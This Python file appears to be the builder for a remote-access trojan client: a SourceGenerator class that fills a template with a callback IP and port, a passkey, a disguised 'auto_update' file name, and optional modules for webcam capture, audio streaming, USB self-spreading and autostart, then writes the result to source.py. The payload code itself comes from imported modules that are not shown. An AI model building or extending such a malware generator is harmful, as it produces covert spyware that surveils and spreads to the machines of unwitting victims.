__author__ = 'Uri Patton'

import client_source
import client_snippets


class SourceGenerator:

    audio = False
    webcam = False
    usb_spreading = False
    autostart = False
    ip_address = '127.0.0.1'
    port = '4434'
    passkey = '1705a7f91b40320a19db18912b72148e'
    filename = 'auto_update'
    working_dir = 'iDocuments'

    def __init__(self):
        pass

    def generate_source(self):
        self.source = client_source.source
        with open('source.py', 'w') as source:
            source.write(self.format_source(self.source))

    def generate_snippets(self):
        return {
            '{%working_directory%}': self.working_dir,
            '{%pyaudioImport%}': 'import pyaudio' if self.audio else "web_camera = 'NoDevice'",
            '{%vidcapImport%}': 'import vidcap' if self.webcam else "audio_input = 'NoDevice'",
            '{%ip_address%}': self.ip_address,
            '{%port_number%}': self.port,
            '{%md5key%}': self.passkey,
            '{%filename%}': self.filename,
            '{%get_webcam_device%}': client_snippets.get_webcam_device if self.webcam else '',
            '{%get_audio_device%}': client_snippets.get_audio_device if self.audio else '',
            '{%initialize_winapi%}': client_snippets.initialize_winapi,
            '{%webcam_shot%}': client_snippets.webcam_shot_function if self.webcam else '',
            '{%audio_streaming_class%}': client_snippets.audio_streaming_class if self.audio else '',
            '{%usb_spreading_class%}': client_snippets.usb_spreading_class if self.usb_spreading else '',
        }

    def input_audio(self, state):
        self.audio = state

    def input_webcam(self, state):
        self.webcam = state

    def input_usb_spreading(self, state):
        self.usb_spreading = state

    def input_autostart(self, state):
        self.autostart = state

    def format_source(self, source):
        snippets = self.generate_snippets()
        return reduce(lambda x, y: x.replace(y, snippets[y]), snippets, source)

a = SourceGenerator()
a.generate_source()